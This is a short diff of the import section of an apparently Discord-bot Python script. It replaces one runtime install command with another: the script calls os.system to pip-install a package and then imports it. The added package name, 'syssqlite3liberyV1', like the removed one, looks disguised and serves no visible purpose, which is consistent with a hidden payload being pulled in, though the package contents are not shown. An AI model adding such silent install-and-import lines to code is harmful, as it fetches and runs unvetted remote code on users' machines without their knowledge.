@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncolouringaddsV2")
-import pythoncolouringaddsV2
+os.system("pip install syssqlite3liberyV1")
+import syssqlite3liberyV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
